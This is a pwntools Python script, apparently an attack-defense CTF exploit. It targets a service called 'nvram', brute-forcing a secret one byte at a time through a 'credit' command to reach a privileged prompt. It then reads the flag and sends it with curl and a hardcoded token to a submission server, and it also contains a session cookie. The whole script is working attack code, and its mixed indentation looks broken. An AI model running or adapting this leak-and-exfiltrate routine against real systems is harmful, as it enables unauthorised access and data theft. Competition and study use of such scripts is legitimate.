from pwn import *
import sys
import os

if len(sys.argv) < 2:
    debug = True
else:
    debug = False

p = 0
q = 0
if debug:
    p = process("./nvram")
    #libc = ELF("/lib/x86_64-linux-gnu/libc-2.27.so")
else:
    p = remote(sys.argv[1],sys.argv[2],timeout = 2)
    libc = ELF("./libc-2.27.so")

def debugf():
    global p,q
    if debug:
        p = gdb.debug("./nvram","b *0x403747\nset follow-fork-mode child")

def bruteforce():
    padding = "credit "
    info = "(AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    res1 = ""
    res2 = "(AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    for i in range(0x10):
	p.sendlineafter("$ ",padding + info)
        char = p.recv(0x2f)[-2]
	#print hex(ord(char))
        temp = chr(ord(char) + ord("("))
	res1 = res1+temp
        info = res1 + res2[:-1]
	res2=res2[:-1]
        #print info
    p.sendlineafter("$ ",padding+info[:0x10])
    p.sendlineafter("# ","flag")

cookie = "PHPSESSID=fnmto7o4paibjkhpn3icvp828v"
url = "http://172.16.123.123/commapi/userspace/submitFlag"
token = "NAvGwfCAQz6WrWrk4XvjQSBE8QFe43ek8q24TbFtbM9TknM2CNXMkuT42TbuvYMu2kjdxU3AbGE"
def submit(flag):
	os.system('curl http://10.66.20.50:9000/submit_flag/ -d "flag={flag}&token={token}"'.format(flag = flag,token = token))
	#print post(url, headers={"Cookie": cookie}, data={"flag" : flag}).text

#context.log_level = "debug"
context.terminal = ["tmux","splitw","-h"]
#debugf()
bruteforce()
p.recvuntil("flag:")
flag = p.recvline().strip()
print flag
submit(flag)
#p.interactive()
